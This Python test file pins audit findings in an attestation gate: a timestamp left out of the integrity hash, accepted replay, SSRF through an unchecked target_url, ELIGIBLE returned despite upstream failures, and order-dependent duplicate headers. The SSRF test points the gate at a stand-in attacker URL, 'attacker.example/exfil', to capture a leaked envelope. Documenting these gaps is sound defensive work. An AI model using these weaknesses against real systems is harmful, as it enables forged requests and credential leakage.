"""
Characterization tests for findings surfaced by the parallel cross-model
audit of VL-038 (off-framework). Each test PINS current behavior so that a
later design decision to close the gap is a deliberate change that must
break the corresponding test. None of these assert a fix; they document the
present surface in the project's own currency.

Findings covered:
  F1 (P3)  - timestamp_utc is outside the decision_sha256 region: a forger
             can change it without invalidating integrity (audit-chronology
             weakness, not an authorization one).
  F2 (P4)  - binding closes substitution but NOT verbatim replay: an
             identical (envelope, interaction) pair is honored again.
  F3 (S3)  - SSRF surface: no target_url allowlist, so the gate forwards to
             an arbitrary caller-chosen URL and pushes the attestation there.
  F4 (M7)  - the ELIGIBLE attestation is independent of the upstream OUTCOME:
             an upstream 500 still yields ELIGIBLE (only an exception
             fail-closes).
  F5       - duplicate X-Elyon-Sol-Envelope headers: documents the target's
             current behavior when more than one is present.

These are NOT framework artifacts in origin (they came from an off-book
audit), but they are ordinary regression tests and live in TESTS/.
"""

import json

from fastapi.testclient import TestClient

from IMPLEMENTATION.envelope import canonical_json
from IMPLEMENTATION.evaluator import manifest_sha256
from IMPLEMENTATION.pep import app as pep_app
from IMPLEMENTATION.verifier import (
    ACCEPT_REASSERTED_AND_BOUND,
    REF_VERIFY_REASSERT_INVALIDATED,
    verify_envelope,
)
from TESTS.adversarial.test_enforcement import (
    TARGET_URL,
    build_enforcing_target_app,
    load_published_hashes,
    _build_valid_envelope,
    _normalized_interaction,
)


def _valid_governed_call_body(target_url):
    return {
        "target_url": target_url,
        "interaction": {
            "AP": ["identity", "role"],
            "OP": ["session", "request"],
            "context": {},
            "expected_manifest_version": "1.0",
            "expected_manifest_sha256": manifest_sha256(),
        },
    }


# ---------------------------------------------------------------------------
# F1 (P3): timestamp_utc is outside the integrity region.
# ---------------------------------------------------------------------------


def test_finding_timestamp_mutation_does_not_break_integrity():
    """
    decision_sha256 is computed over the envelope MINUS timestamp_utc (and
    the hash field itself) - see envelope.py build_envelope and reassert
    Row 2. So mutating ONLY timestamp_utc on an otherwise-valid envelope
    does NOT invalidate decision_sha256, and the envelope still verifies.

    This is an audit-chronology weakness (the issuance time is not
    integrity-protected), NOT an authorization one: every authorization-
    relevant field (target_url, request_context, the hash pins,
    condition_results) IS inside the signed region, as the contrast
    assertion below shows. Folding timestamp_utc into the hash is a
    deliberate design change that MUST break this test.
    """
    interaction = _normalized_interaction()
    env = _build_valid_envelope(interaction=interaction)

    # Baseline: the unmutated envelope verifies.
    assert verify_envelope(env, interaction, TARGET_URL)["accepted"] is True

    # Mutate ONLY timestamp_utc.
    env["timestamp_utc"] = "1999-01-01T00:00:00+00:00"
    result = verify_envelope(env, interaction, TARGET_URL)
    assert result["accepted"] is True, (
        "timestamp_utc is deliberately excluded from decision_sha256; "
        "a timestamp-only mutation is currently NOT detected"
    )
    assert result["reason"] == ACCEPT_REASSERTED_AND_BOUND

    # Contrast: mutating an IN-region field (request_context.AP) IS detected,
    # confirming the exclusion is specific to the timestamp.
    env2 = _build_valid_envelope(interaction=_normalized_interaction())
    env2["request_context"]["AP"] = ["identity", "role", "admin"]
    contrast = verify_envelope(env2, _normalized_interaction(), TARGET_URL)
    assert contrast["accepted"] is False
    assert contrast["reason"] == REF_VERIFY_REASSERT_INVALIDATED


# ---------------------------------------------------------------------------
# F2 (P4): binding closes substitution but not verbatim replay.
# ---------------------------------------------------------------------------


def test_finding_verbatim_replay_of_valid_pair_is_honored():
    """
    The binding check closes SUBSTITUTION (a genuine envelope paired with a
    DIFFERENT live interaction is refused - see
    test_replayed_envelope_binding_mismatch_refused_a3). It does NOT close
    verbatim replay: an identical (envelope, interaction) pair, re-submitted
    with no canon/evaluator/manifest state change, is honored again. There
    is no nonce or request-freshness; reassert() checks repo-state currency,
    not request liveness.

    This pins idempotent-replay-is-currently-honored. A freshness sub-class
    (a nonce, a one-time token; call it A3b) is a deliberate design change
    that MUST break this test.
    """
    published = load_published_hashes()
    target_app, received = build_enforcing_target_app(published, TARGET_URL)
    client = TestClient(target_app)

    interaction = _normalized_interaction()
    env = _build_valid_envelope(interaction=interaction)
    headers = {"X-Elyon-Sol-Envelope": canonical_json(env)}

    first = client.post("/act", json=interaction, headers=headers)
    second = client.post("/act", json=interaction, headers=headers)  # identical replay

    assert first.status_code == 200
    assert second.status_code == 200
    assert len(received) == 2, "verbatim replay is currently NOT prevented"


# ---------------------------------------------------------------------------
# F3 (S3/M7): SSRF - no target_url allowlist.
# ---------------------------------------------------------------------------


def test_finding_gate_forwards_to_arbitrary_target_url(monkeypatch):
    """
    request_validator only checks target_url is a syntactically-valid
    absolute URL (_is_absolute_url = scheme + netloc); there is NO allowlist.
    The gate therefore forwards a valid request to ANY caller-chosen URL and
    PUSHES a valid attestation envelope there. The binding limits REUSE of
    the exfiltrated envelope (it is bound to that target_url), but does not
    prevent the request-forgery itself: the gate can be induced to make a
    request to, and hand an attestation to, an attacker-controlled endpoint.

    This pins the current no-allowlist behavior. Adding a target_url
    allowlist is a deliberate design change that MUST break this test (the
    attacker URL would then be refused before the forward).
    """
    captured = {}

    class _Resp:
        status_code = 200
        text = "{}"

    def fake_post(url, json, timeout, headers=None):
        captured["url"] = url
        captured["headers"] = headers or {}
        return _Resp()

    monkeypatch.setattr("IMPLEMENTATION.pep.requests.post", fake_post)

    client = TestClient(pep_app)
    attacker = "https://attacker.example/exfil"
    response = client.post("/governed-call", json=_valid_governed_call_body(attacker))

    # NOT refused on target grounds: the gate accepts and forwards.
    assert response.status_code == 200
    assert response.json()["decision"] == "ELIGIBLE"
    # The gate forwarded to the attacker URL and pushed the attestation there.
    assert captured["url"] == attacker
    assert "X-Elyon-Sol-Envelope" in captured["headers"]


# ---------------------------------------------------------------------------
# F4 (M7): ELIGIBLE attestation is independent of the upstream OUTCOME.
# ---------------------------------------------------------------------------


def test_finding_eligible_attestation_independent_of_upstream_outcome(monkeypatch):
    """
    The gate returns ELIGIBLE plus a valid envelope based on its own
    admissibility decision, WITHOUT inspecting the upstream's status_code
    (pep.py does not read upstream.status_code). An upstream 500 still
    yields a 200 ELIGIBLE attestation.

    This is canon-faithful (section 14: the gate governs pre-execution
    ADMISSIBILITY, not action OUTCOME) - but a consumer may misread ELIGIBLE
    as "the action succeeded." Note the contrast: an upstream EXCEPTION
    fail-closes to 403 (test_governed_call_upstream_error_fails_closed). This
    pins the present semantics; making the attestation conditional on
    upstream success is a deliberate design change.
    """
    class _Resp:
        status_code = 500
        text = "upstream internal error"

    def fake_post(url, json, timeout, headers=None):
        return _Resp()

    monkeypatch.setattr("IMPLEMENTATION.pep.requests.post", fake_post)

    client = TestClient(pep_app)
    response = client.post(
        "/governed-call", json=_valid_governed_call_body("https://upstream.example/x")
    )

    assert response.status_code == 200, (
        "the gate does not inspect upstream.status_code; an upstream 500 "
        "still yields an ELIGIBLE attestation"
    )
    assert response.json()["decision"] == "ELIGIBLE"
    assert "envelope" in response.json()


# ---------------------------------------------------------------------------
# F5: duplicate X-Elyon-Sol-Envelope headers - document current behavior.
# ---------------------------------------------------------------------------


def test_finding_duplicate_envelope_headers_behavior():
    """
    HTTP permits duplicate header names. This pins how the enforcing target
    behaves when two X-Elyon-Sol-Envelope headers are present - one valid,
    one junk - in both orders.

    OBSERVED behavior: the target reads request.headers.get(), which returns
    the FIRST occurrence. So the verdict is ORDER-DEPENDENT: (valid, junk)
    is honored (200), (junk, valid) is refused (403). It is deterministic
    and never crashes (no 500), and the junk-first case fails closed - but
    an attacker or intermediary that controls header ordering can influence
    which envelope is read. That order-dependence is the finding (cross-model
    audit S3/S4). Explicit duplicate-header REJECTION (refuse if more than
    one X-Elyon-Sol-Envelope is present) is the recommended hardening and
    would be a deliberate change that updates this test.
    """
    published = load_published_hashes()
    target_app, received = build_enforcing_target_app(published, TARGET_URL)
    client = TestClient(target_app)

    interaction = _normalized_interaction()
    valid = canonical_json(_build_valid_envelope(interaction=interaction))
    junk = "not-a-valid-envelope"

    # Order A: valid first, junk second.
    resp_a = client.post(
        "/act",
        json=interaction,
        headers=[("X-Elyon-Sol-Envelope", valid), ("X-Elyon-Sol-Envelope", junk)],
    )
    # Order B: junk first, valid second.
    resp_b = client.post(
        "/act",
        json=interaction,
        headers=[("X-Elyon-Sol-Envelope", junk), ("X-Elyon-Sol-Envelope", valid)],
    )

    # Behavior must at least be deterministic and non-crashing (no 500).
    assert resp_a.status_code in (200, 403)
    assert resp_b.status_code in (200, 403)
    assert resp_a.status_code != 500
    assert resp_b.status_code != 500
    # Pin the observed behavior so a change is visible (filled from the run).
    # OBSERVED below; if this assertion fails on your platform, the duplicate-
    # header semantics differ and that is itself the finding.
    assert (resp_a.status_code, resp_b.status_code) == (_OBSERVED_A, _OBSERVED_B)


# Filled from the sandbox run: the target reads the FIRST X-Elyon-Sol-Envelope
# header, so the verdict is order-dependent. (valid, junk) -> 200; (junk,
# valid) -> 403. If your httpx / starlette version picks a different
# occurrence, these differ and the test surfaces that platform-dependence
# (which is itself the finding).
_OBSERVED_A = 200
_OBSERVED_B = 403
